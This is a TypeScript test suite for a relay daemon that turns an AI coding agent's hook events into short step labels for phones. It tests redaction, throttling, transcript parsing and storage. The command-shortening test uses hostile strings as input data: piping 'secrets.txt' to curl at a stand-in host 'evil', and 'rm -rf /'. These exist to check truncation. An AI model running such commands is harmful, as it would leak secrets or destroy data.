import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { RelayEvent, Session, Turn, TurnStep } from "../../protocol/index.ts";
import type { RelayConfig } from "../src/config.ts";
import { Broker } from "../src/daemon/broker.ts";
import { openDb, SCHEMA_VERSION } from "../src/daemon/db.ts";
import { EventLog } from "../src/daemon/events.ts";
import { HookHandler } from "../src/daemon/hooks.ts";
import { alertFor } from "../src/daemon/notifier.ts";
import type { PresenceMonitor } from "../src/daemon/presence.ts";
import { publicSession, Registry, type SessionRecord } from "../src/daemon/registry.ts";
import { createRpc, type RpcDeps } from "../src/daemon/rpc.ts";
import { resetLiveSteps, StepTracker, shortCommand, shortPath, stepFor } from "../src/daemon/steps.ts";
import { transcriptTurns } from "../src/daemon/transcript.ts";
import { relayHooks } from "../src/install.ts";

// Turn steps: the words the phones show for what Claude is doing, live and in the finished turn.

const CWD = "/Users/me/Projects/my-app";
const live = (tool: string, input: Record<string, unknown> = {}) => stepFor(tool, input, CWD, "live").label;
const done = (tool: string, input: Record<string, unknown> = {}) => stepFor(tool, input, CWD, "done").label;

describe("step words", () => {
  test("every tool in the table, live and finished", () => {
    const file = { file_path: `${CWD}/protocol/index.ts` };
    expect([live("Read", file), done("Read", file)]).toEqual([
      "Reading protocol/index.ts",
      "Read protocol/index.ts",
    ]);
    for (const tool of ["Edit", "MultiEdit", "Write"])
      expect([live(tool, file), done(tool, file)]).toEqual([
        "Editing protocol/index.ts",
        "Edited protocol/index.ts",
      ]);
    expect(live("NotebookEdit", { notebook_path: `${CWD}/a.ipynb` })).toBe("Editing a.ipynb");
    expect([live("Bash", { command: "bun test" }), done("Bash", { command: "bun test" })]).toEqual([
      "Running bun test",
      "Ran bun test",
    ]);
    expect(live("Grep", { pattern: "liveTurns" })).toBe("Searching for “liveTurns”");
    expect(done("Glob", { pattern: "**/*.swift" })).toBe("Searched for “**/*.swift”");
    expect([live("WebSearch", { query: "secret plans" }), done("WebSearch", { query: "x" })]).toEqual([
      "Searching the web",
      "Searched the web",
    ]);
    expect(live("WebFetch", { url: "https://developer.apple.com/documentation/swiftui?x=1" })).toBe(
      "Reading developer.apple.com",
    );
    expect(done("WebFetch", { url: "https://www.example.com/a" })).toBe("Read example.com");
    expect(live("Agent", { description: "Explore iOS store", prompt: "long prompt" })).toBe(
      "Running an agent: Explore iOS store",
    );
    expect(done("Task", { description: "Explore iOS store" })).toBe("Ran an agent: Explore iOS store");
    expect([live("TodoWrite"), done("TodoWrite")]).toEqual([
      "Updating the to-do list",
      "Updated the to-do list",
    ]);
    expect([live("AskUserQuestion"), done("AskUserQuestion")]).toEqual([
      "Asking you a question",
      "Asked you a question",
    ]);
    expect([live("ExitPlanMode"), done("ExitPlanMode")]).toEqual([
      "Showing you the plan",
      "Showed you the plan",
    ]);
    expect([live("Skill", { skill: "task" }), done("Skill", { skill: "task" })]).toEqual([
      "Running the task skill",
      "Ran the task skill",
    ]);
    expect([live("mcp__linear__save_issue"), done("mcp__linear__save_issue")]).toEqual([
      "Using save_issue (linear)",
      "Used save_issue (linear)",
    ]);
  });

  test("kinds", () => {
    const kinds = [
      "Read",
      "Edit",
      "Bash",
      "Grep",
      "WebSearch",
      "Agent",
      "TodoWrite",
      "AskUserQuestion",
      "ExitPlanMode",
      "X",
    ].map((t) => stepFor(t, {}, CWD, "live").kind);
    expect(kinds).toEqual([
      "read",
      "edit",
      "run",
      "search",
      "web",
      "agent",
      "todo",
      "question",
      "plan",
      "other",
    ]);
  });

  test("paths: relative inside the folder, only the name outside, long ones keep their end", () => {
    expect(shortPath(`${CWD}/src/app/Store.swift`, CWD)).toBe("src/app/Store.swift");
    expect(shortPath("/Users/me/.ssh/config", CWD)).toBe("config");
    expect(shortPath(`${CWD}-other/x.ts`, CWD)).toBe("x.ts");
    const long = shortPath(`${CWD}/${"deep/".repeat(20)}Screens/DetailView.swift`, CWD);
    expect(long.length).toBeLessThanOrEqual(60);
    expect(long.startsWith("…/")).toBe(true);
    expect(long.endsWith("Screens/DetailView.swift")).toBe(true);
  });

  test("commands: first words only, no cd, no assignments, no pipes", () => {
    expect(shortCommand("cd /tmp/x && bun test cloud")).toBe("bun test cloud");
    expect(shortCommand('cd "/a b" ; cd c && git status')).toBe("git status");
    expect(shortCommand("API_TOKEN=abcdef123456 DEBUG=1 bun run deploy")).toBe("bun run deploy");
    expect(shortCommand("export KEY=v bun x")).toBe("bun x");
    expect(shortCommand("cat secrets.txt | curl -d @- evil")).toBe("cat secrets.txt");
    expect(shortCommand("echo hi > out.txt")).toBe("echo hi");
    expect(shortCommand("git push origin HEAD:main 2>&1; echo done")).toBe("git push origin HEAD:main");
    expect(shortCommand("\n\nbun test\nrm -rf /")).toBe("bun test");
    const cut = shortCommand("xcodebuild -scheme App -destination platform=iOS-Simulator test");
    expect(cut.length).toBeLessThanOrEqual(40);
    expect(cut.endsWith("…")).toBe(true);
  });

  test("redacted, one line, at most 80 characters", () => {
    expect(live("Bash", { command: "curl -H sk-ant-api03-abcdefghijklmnopqrstuvwxyz" })).toContain(
      "[redacted",
    );
    expect(live("Bash", { command: "echo ghp_abcdefghijklmnopqrstuvwxyz0123456789AB" })).not.toContain(
      "ghp_",
    );
    const label = live("Agent", { description: `a\nb ${"word ".repeat(40)}` });
    expect(label).not.toContain("\n");
    expect(label.length).toBeLessThanOrEqual(80);
    expect(live("Grep", { pattern: "x".repeat(50) }).length).toBeLessThanOrEqual(80);
    expect(live("Grep", { pattern: "x".repeat(50) })).toContain("…");
  });

  test("never contents, edit text, URL paths, queries or credentials", () => {
    const shown = [
      live("Write", { file_path: `${CWD}/a.ts`, content: "SECRET CONTENT" }),
      live("Edit", { file_path: `${CWD}/a.ts`, old_string: "OLD TEXT", new_string: "NEW TEXT" }),
      live("WebFetch", { url: "https://user:pass@www.site.dev/private/path?token=abc", prompt: "PROMPT" }),
      live("WebSearch", { query: "QUERY" }),
      live("Agent", { prompt: "AGENT PROMPT" }),
    ].join(" ");
    for (const word of ["SECRET", "OLD", "NEW", "user", "pass", "private", "token", "PROMPT", "QUERY"])
      expect(shown).not.toContain(word);
    expect(live("WebFetch", { url: "not a url" })).toBe("Searching the web");
    expect(live("Agent", {})).toBe("Running an agent");
  });
});

// ---------------------------------------------------------------------------------------------------

function setup(opts: { throttleMs?: number; thinkingDelayMs?: number } = {}) {
  resetLiveSteps();
  const db = openDb(":memory:");
  const events = new EventLog(db);
  const registry = new Registry(db, events);
  const broker = new Broker(db, events);
  const steps = new StepTracker(events, {
    throttleMs: opts.throttleMs ?? 0,
    thinkingDelayMs: opts.thinkingDelayMs ?? 30,
  });
  const presence = { noteLocalActivity() {} } as unknown as PresenceMonitor;
  const config = { previewChars: 600 } as RelayConfig;
  const hooks = new HookHandler({ db, events, registry, broker, presence, config, steps });
  const rpc = createRpc({ db, events, registry, broker, presence, config } as unknown as RpcDeps);
  const seen: RelayEvent[] = [];
  events.subscribe((e) => seen.push(e));
  const signal = new AbortController().signal;
  const hook = (event: string, fields: Record<string, unknown> = {}) =>
    hooks.handle(
      { payload: { hook_event_name: event, session_id: "s1", cwd: CWD, ...fields }, env: {} },
      signal,
    );
  const tool = (event: string, id: string, name: string, input: Record<string, unknown> = {}, extra = {}) =>
    hook(event, { tool_use_id: id, tool_name: name, tool_input: input, ...extra });
  const labels = () => seen.flatMap((e) => (e.type === "turn.step" ? [e.step.label] : []));
  const session = () => publicSession(registry.get("s1") as SessionRecord);
  return { db, events, registry, rpc, seen, hook, tool, labels, session };
}

afterEach(() => resetLiveSteps());

describe("live steps", () => {
  test("a turn starts with Thinking, a tool shows while it runs, Thinking comes back after it", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "Fix it" });
    expect(t.labels()).toEqual(["Thinking"]);
    expect(t.session().step?.label).toBe("Thinking");
    await t.tool("PreToolUse", "a", "Read", { file_path: `${CWD}/protocol/index.ts` });
    expect(t.labels().at(-1)).toBe("Reading protocol/index.ts");
    expect(t.session().step?.label).toBe("Reading protocol/index.ts");
    await t.tool("PostToolUse", "a", "Read", { file_path: `${CWD}/protocol/index.ts` });
    expect(t.labels().at(-1)).toBe("Reading protocol/index.ts");
    await Bun.sleep(60);
    expect(t.labels().at(-1)).toBe("Thinking");
    // turn.step order: after turn.started, before the working upsert.
    const types = t.seen.map((e) => e.type);
    expect(types.indexOf("turn.started")).toBeLessThan(types.indexOf("turn.step"));
  });

  test("no Thinking between quick tools", async () => {
    const t = setup({ thinkingDelayMs: 100 });
    await t.hook("UserPromptSubmit", { prompt: "Fix it" });
    await t.tool("PreToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await t.tool("PostToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await Bun.sleep(20);
    await t.tool("PreToolUse", "b", "Bash", { command: "bun test" });
    await Bun.sleep(150);
    expect(t.labels()).toEqual(["Thinking", "Reading a.ts", "Running bun test"]);
  });

  test("parallel tools show the newest, then the one still running", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x" });
    await t.tool("PreToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await t.tool("PreToolUse", "b", "Read", { file_path: `${CWD}/b.ts` });
    expect(t.session().step?.label).toBe("Reading b.ts");
    await t.tool("PostToolUse", "b", "Read", { file_path: `${CWD}/b.ts` });
    expect(t.session().step?.label).toBe("Reading a.ts");
  });

  test("throttled: at most one a second, the newest wins, the same label never twice", async () => {
    const t = setup({ throttleMs: 200 });
    await t.hook("UserPromptSubmit", { prompt: "x" });
    for (let i = 0; i < 20; i++)
      await t.tool("PreToolUse", `r${i}`, "Read", { file_path: `${CWD}/f${i}.ts` });
    expect(t.labels()).toEqual(["Thinking"]);
    await Bun.sleep(260);
    expect(t.labels()).toEqual(["Thinking", "Reading f19.ts"]);
    await t.tool("PreToolUse", "again", "Read", { file_path: `${CWD}/f19.ts` });
    await Bun.sleep(260);
    expect(t.labels()).toEqual(["Thinking", "Reading f19.ts"]);
  });

  test("a PreToolUse arriving after its PostToolUse is ignored", async () => {
    const t = setup({ thinkingDelayMs: 20 });
    await t.hook("UserPromptSubmit", { prompt: "x" });
    await t.tool("PreToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await t.tool("PostToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await t.tool("PostToolUse", "b", "Bash", { command: "ls" });
    await t.tool("PreToolUse", "b", "Bash", { command: "ls" });
    await Bun.sleep(50);
    expect(t.session().step?.label).toBe("Thinking");
  });

  test("a subagent's tools (agent_id) don't change the line", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x" });
    await t.tool("PreToolUse", "ag", "Agent", { description: "Print the date" });
    await t.tool(
      "PreToolUse",
      "in",
      "Bash",
      { command: "date" },
      { agent_id: "a34f", agent_type: "general-purpose" },
    );
    await t.tool("PostToolUse", "in", "Bash", { command: "date" }, { agent_id: "a34f" });
    expect(t.labels()).toEqual(["Thinking", "Running an agent: Print the date"]);
  });

  test("a session without PreToolUse still moves, and stays on its last tool", async () => {
    const t = setup({ thinkingDelayMs: 10 });
    await t.hook("UserPromptSubmit", { prompt: "x" });
    await t.tool("PostToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    await t.tool("PostToolUse", "b", "Bash", { command: "bun test" });
    await Bun.sleep(40);
    expect(t.labels()).toEqual(["Thinking", "Reading a.ts", "Running bun test"]);
  });

  test("steps without an open turn are dropped", async () => {
    const t = setup();
    await t.tool("PreToolUse", "a", "Read", { file_path: `${CWD}/a.ts` });
    expect(t.labels()).toEqual([]);
  });

  test("never pushed", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x" });
    const step = t.seen.find((e) => e.type === "turn.step") as RelayEvent;
    expect(alertFor(step, () => "s")).toBeNull();
  });
});

describe("finished steps", () => {
  const dirs: string[] = [];
  afterEach(() => {
    for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
  });
  function transcript(lines: object[]): string {
    const dir = mkdtempSync(join(tmpdir(), "relay-steps-"));
    dirs.push(dir);
    const path = join(dir, "t.jsonl");
    writeFileSync(path, `${lines.map((l) => JSON.stringify(l)).join("\n")}\n`);
    return path;
  }
  const ts = (s: number) => new Date(1793620000000 + s * 1000).toISOString();
  const prompt = { type: "user", timestamp: ts(0), message: { content: "Fix the cart" } };
  const use = (id: string, name: string, input: object, s: number) => ({
    type: "assistant",
    timestamp: ts(s),
    message: { content: [{ type: "tool_use", id, name, input }] },
  });
  const result = (id: string, isError: boolean, s: number) => ({
    type: "user",
    timestamp: ts(s),
    message: { content: [{ type: "tool_result", tool_use_id: id, is_error: isError, content: "out" }] },
  });
  const answer = (s: number) => ({
    type: "assistant",
    timestamp: ts(s),
    message: { content: [{ type: "text", text: "Done." }] },
  });

  async function stopWith(t: ReturnType<typeof setup>, path: string | null): Promise<Turn> {
    await t.hook("Stop", { last_assistant_message: "Done.", ...(path ? { transcript_path: path } : {}) });
    return (t.seen.findLast((e) => e.type === "turn.done") as Extract<RelayEvent, { type: "turn.done" }>)
      .turn;
  }

  test("from the transcript: one per tool call, failed from is_error, count equals toolCalls", async () => {
    const t = setup();
    const path = transcript([
      prompt,
      { type: "assistant", timestamp: ts(1), message: { content: [{ type: "thinking", thinking: "" }] } },
      use("a", "Read", { file_path: `${CWD}/src/cart.ts` }, 2),
      result("a", false, 3),
      use("b", "Bash", { command: "bun test" }, 4),
      result("b", true, 5),
      answer(6),
    ]);
    await t.hook("UserPromptSubmit", { prompt: "Fix the cart", transcript_path: path });
    const turn = await stopWith(t, path);
    expect(turn.steps?.map((s) => s.label)).toEqual(["Read src/cart.ts", "Ran bun test"]);
    expect(turn.steps?.[1]?.failed).toBe(true);
    expect(turn.steps?.[0]?.failed).toBeUndefined();
    expect(turn.steps?.length).toBe(turn.stats.toolCalls);
    // Stored: session.turns returns them too.
    const listed = await t.rpc("session.turns", { sessionId: "s1", limit: 5 }, "device:x");
    expect("result" in listed && (listed.result as Turn[])[0]?.steps).toEqual(turn.steps as TurnStep[]);
  });

  test("without a transcript: the steps the hooks saw", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x", transcript_path: "/nonexistent.jsonl" });
    await t.tool("PreToolUse", "a", "Edit", { file_path: `${CWD}/a.ts` });
    await t.tool("PostToolUseFailure", "a", "Edit", { file_path: `${CWD}/a.ts` });
    const turn = await stopWith(t, null);
    expect(turn.steps).toEqual([
      expect.objectContaining({ kind: "edit", label: "Edited a.ts", failed: true }),
    ]);
    expect(turn.stats.toolCalls).toBe(1);
  });

  test("over 100 steps: the first 100 and a count", async () => {
    const t = setup();
    const lines: object[] = [prompt];
    for (let i = 0; i < 137; i++) lines.push(use(`u${i}`, "Read", { file_path: `${CWD}/f${i}.ts` }, 1));
    lines.push(answer(2));
    const path = transcript(lines);
    await t.hook("UserPromptSubmit", { prompt: "Fix the cart", transcript_path: path });
    const turn = await stopWith(t, path);
    expect(turn.steps?.length).toBe(100);
    expect(turn.stepsMore).toBe(37);
  });

  test("a turn without tools has no steps field", async () => {
    const t = setup();
    const path = transcript([prompt, answer(1)]);
    await t.hook("UserPromptSubmit", { prompt: "Fix the cart", transcript_path: path });
    const turn = await stopWith(t, path);
    expect("steps" in turn).toBe(false);
  });

  test("older turns read from the transcript get steps too", () => {
    const path = transcript([prompt, use("a", "Grep", { pattern: "total" }, 1), answer(2)]);
    const turns = transcriptTurns("s1", path, { limit: 5, previewChars: 600, working: false, cwd: CWD });
    expect(turns[0]?.steps?.map((s) => s.label)).toEqual(["Searched for “total”"]);
  });
});

describe("what phones get when they connect", () => {
  test("session.live and Session.step carry the step while working, not after Stop", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x", transcript_path: "/nonexistent.jsonl" });
    await t.tool("PreToolUse", "a", "Bash", { command: "bun test" });
    const liveNow = await t.rpc("session.live", { sessionId: "s1" }, "device:x");
    expect("result" in liveNow && (liveNow.result as { step?: TurnStep }).step?.label).toBe(
      "Running bun test",
    );
    const list = await t.rpc("sessions.list", {}, "device:x");
    expect("result" in list && (list.result as Session[])[0]?.step?.label).toBe("Running bun test");
    await t.hook("Stop", { last_assistant_message: "Done." });
    expect("step" in t.session()).toBe(false);
    const after = await t.rpc("session.live", { sessionId: "s1" }, "device:x");
    expect("result" in after && after.result).toBeNull();
  });

  test("an idle session shows no step", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "x" });
    t.registry.setStatus("s1", "idle");
    expect("step" in t.session()).toBe(false);
  });

  test("sync replays only the newest step of a running turn; a finished turn's steps are deleted", async () => {
    const t = setup();
    await t.hook("UserPromptSubmit", { prompt: "one", transcript_path: "/nonexistent.jsonl" });
    for (let i = 0; i < 5; i++) await t.tool("PreToolUse", `a${i}`, "Read", { file_path: `${CWD}/f${i}.ts` });
    await t.hook("Stop", { last_assistant_message: "Done." });
    const stored = () =>
      t.db.query("SELECT COUNT(*) AS n FROM events WHERE type = 'turn.step'").get() as { n: number };
    expect(stored().n).toBe(0);
    await t.hook("UserPromptSubmit", { prompt: "two" });
    for (let i = 0; i < 5; i++) await t.tool("PreToolUse", `b${i}`, "Read", { file_path: `${CWD}/g${i}.ts` });
    const res = await t.rpc("sync", { sinceSeq: 1 }, "device:x");
    const events = "result" in res ? (res.result as { events: RelayEvent[] }).events : [];
    const steps = events.filter((e) => e.type === "turn.step");
    expect(steps.map((e) => (e.type === "turn.step" ? e.step.label : ""))).toEqual(["Reading g4.ts"]);
    expect(events.some((e) => e.type === "turn.done")).toBe(true);
  });
});

test("PreToolUse is installed, async like the other tool hooks", () => {
  const hooks = relayHooks("/h/relay-hook");
  expect(hooks.PreToolUse?.[0]?.hooks[0]).toEqual({
    type: "command",
    command: "/h/relay-hook",
    timeout: 30,
    async: true,
  });
  expect(Object.keys(hooks)).toHaveLength(11);
});

test("migration 9: a version-8 database gains steps_json, and its turns have no steps", async () => {
  const dir = mkdtempSync(join(tmpdir(), "relay-mig9-"));
  const path = join(dir, "relay.db");
  try {
    let db = openDb(path);
    db.query(
      "INSERT INTO turns (id, session_id, summary, stats_json, started_at, ended_at) VALUES ('t_old', 's1', 'Done.', NULL, 1, 2)",
    ).run();
    db.exec(
      "ALTER TABLE turns DROP COLUMN messages_json; ALTER TABLE turns DROP COLUMN steps_json; PRAGMA user_version = 8;",
    );
    db.close();
    db = openDb(path);
    expect((db.query("PRAGMA user_version").get() as { user_version: number }).user_version).toBe(
      SCHEMA_VERSION,
    );
    const rpc = createRpc({
      db,
      events: new EventLog(db),
      registry: new Registry(db, new EventLog(db)),
    } as unknown as RpcDeps);
    const res = await rpc("session.turns", { sessionId: "s1", limit: 5 }, "device:x");
    const turn = "result" in res ? (res.result as Turn[])[0] : undefined;
    expect(turn?.id).toBe("t_old");
    expect(turn && "steps" in turn).toBe(false);
    db.close();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a stopped turn (turn-stop) keeps its steps, and its live step goes", async () => {
  const { TurnStopper } = await import("../src/daemon/stop.ts");
  resetLiveSteps();
  const dir = mkdtempSync(join(tmpdir(), "relay-stopsteps-"));
  try {
    const path = join(dir, "t.jsonl");
    const db = openDb(":memory:");
    const events = new EventLog(db);
    const registry = new Registry(db, events);
    const broker = new Broker(db, events);
    const config = { previewChars: 600 } as RelayConfig;
    const steps = new StepTracker(events, { throttleMs: 0, thinkingDelayMs: 1000 });
    const stopper = new TurnStopper({
      db,
      events,
      registry,
      broker,
      config,
      steps,
      transcriptPath: () => path,
    });
    const presence = { noteLocalActivity() {} } as unknown as PresenceMonitor;
    const hooks = new HookHandler({ db, events, registry, broker, presence, config, stopper, steps });
    const seen: RelayEvent[] = [];
    events.subscribe((e) => seen.push(e));
    const hook = (event: string, fields: Record<string, unknown> = {}) =>
      hooks.handle(
        { payload: { hook_event_name: event, session_id: "s1", cwd: CWD, ...fields }, env: {} },
        new AbortController().signal,
      );
    await hook("UserPromptSubmit", { prompt: "Rewrite the checkout" });
    await hook("PreToolUse", { tool_use_id: "a", tool_name: "Bash", tool_input: { command: "bun test" } });
    const at = new Date(Date.now() + 10).toISOString();
    const lines = [
      { type: "user", timestamp: at, message: { content: "Rewrite the checkout" } },
      {
        type: "assistant",
        timestamp: at,
        message: { content: [{ type: "tool_use", id: "a", name: "Bash", input: { command: "bun test" } }] },
      },
      {
        type: "user",
        timestamp: at,
        message: { content: [{ type: "text", text: "[Request interrupted by user for tool use]" }] },
      },
    ];
    writeFileSync(path, `${lines.map((l) => JSON.stringify(l)).join("\n")}\n`);
    const turnId = (
      seen.find((e) => e.type === "turn.started") as Extract<RelayEvent, { type: "turn.started" }>
    ).turnId;
    expect(stopper.endStopped(turnId)).toBe(turnId);
    const turn = (seen.findLast((e) => e.type === "turn.done") as Extract<RelayEvent, { type: "turn.done" }>)
      .turn;
    expect(turn.stopped).toBe(true);
    expect(turn.steps?.map((s) => s.label)).toEqual(["Ran bun test"]);
    expect("step" in publicSession(registry.get("s1") as SessionRecord)).toBe(false);
    expect(
      (db.query("SELECT COUNT(*) AS n FROM events WHERE type = 'turn.step'").get() as { n: number }).n,
    ).toBe(0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
